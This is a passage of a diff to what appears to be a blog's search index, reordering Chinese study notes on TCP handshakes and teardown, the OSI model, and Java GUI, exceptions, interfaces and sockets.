-<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
-</li>
-</ul>
-<p>参考文章：</p>
-<ul>
-<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
       </tags>
   </entry>
   <entry>
@@ -1379,65 +1311,40 @@
       </tags>
   </entry>
   <entry>
-    <title>Java-GUI编程</title>
-    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
-<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
-<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
-<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
-<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
-<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
-<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+    <title>TCP&amp;IP</title>
+    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
+    <content><![CDATA[<h2 id="TCP的三次握手和四次挥手"><a class="header-anchor" href="#TCP的三次握手和四次挥手"></a>TCP的三次握手和四次挥手</h2>
+<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
+<ul>
+<li>
+<p>三次握手</p>
+<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
+<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
+<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
+<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
+<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
+<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
+<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
+</li>
+<li>
+<p>四次挥手</p>
+<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
+<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
+<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
+</li>
+</ul>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
+</ul>
 ]]></content>
       <categories>
-        <category>编程语言</category>
-        <category>Java</category>
+        <category>专业课</category>
+        <category>计网</category>
       </categories>
       <tags>
-        <tag>Java</tag>
-        <tag>GUI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java 异常及处理</title>
-    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
-    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
-<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
-<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
-<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
-<p>不处理异常，将异常抛出给调用者。</p>
-<p><code>throw</code>  、<code>throws</code></p>
-<p>（挖坑待填）</p>
-<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
-<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
-<ol>
-<li>可能出现异常的代码用<code>try</code>块括起来</li>
-<li>用<code>catch</code>块来捕获异常并处理异常</li>
-<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
-</ol>
-<p><strong>代码执行过程的三种情况</strong></p>
-<ol>
-<li>
-<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
-</li>
-</ol>
-<blockquote>
-<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
-<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
+        <tag>计算机网络</tag>
       </tags>
   </entry>
   <entry>
@@ -1504,33 +1411,34 @@
       </tags>
   </entry>
   <entry>
-    <title>Java 抽象类和接口</title>
-    <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
-    <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
-<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
-<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
-<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
-<p>抽象方法没有方法体。</p>
-<p>关键字：<code>abstract</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public abstract Class1&#123;</span><br><span class="line">	public abstract void fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
-<p>接口和抽象类有点像，它是抽象方法的集合；</p>
-<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
-<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
-<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
-<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
-<p>关键字：<code>interface</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[访问控制关键字] interface 接口名称 [extends 其他的接口名] &#123;</span><br><span class="line">        &#x2F;&#x2F; 声明变量</span><br><span class="line">        &#x2F;&#x2F; 抽象方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
-<p>关键字：<code>implements</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class A implements 接口名称 [,接口名称,...]&#123;</span><br><span class="line">		&#x2F;&#x2F;实现接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>OSI模型</title>
+    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
+<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
+<p>能产生数据流量的并且能与用户交互的程序</p>
+<p>记事本不是，因为不能产生数据流量</p>
+<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
+<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
+<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
+<p>对话控制（记录该由谁来发送数据）</p>
+<p>令牌管理（禁止双方同时执行同一关键操作）</p>
+<p>同步功能（设置断点，崩溃恢复）</p>
+<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
+<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
+<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
+<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
+<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
+<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
+<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
+<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
+<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
 ]]></content>
       <categories>
-        <category>编程语言</category>
-        <category>Java</category>
+        <category>专业课</category>
+        <category>计网</category>
       </categories>
       <tags>
-        <tag>Java</tag>
+        <tag>计算机网络</tag>
       </tags>
   </entry>
   <entry>
@@ -1542,6 +1450,48 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
 <p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
 <p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 异常及处理</title>
+    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
+<li>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
+</li>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -1636,6 +1586,56 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java-GUI编程</title>
+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>GUI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 抽象类和接口</title>
+    <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
+    <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
+<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
+<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
+<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
+<p>抽象方法没有方法体。</p>
+<p>关键字：<code>abstract</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public abstract Class1&#123;</span><br><span class="line">	public abstract void fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
+<p>接口和抽象类有点像，它是抽象方法的集合；</p>
+<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
+<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
+<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
+<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
+<p>关键字：<code>interface</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[访问控制关键字] interface 接口名称 [extends 其他的接口名] &#123;</span><br><span class="line">        &#x2F;&#x2F; 声明变量</span><br><span class="line">        &#x2F;&#x2F; 抽象方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
+<p>关键字：<code>implements</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class A implements 接口名称 [,接口名称,...]&#123;</span><br><span class="line">		&#x2F;&#x2F;实现接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
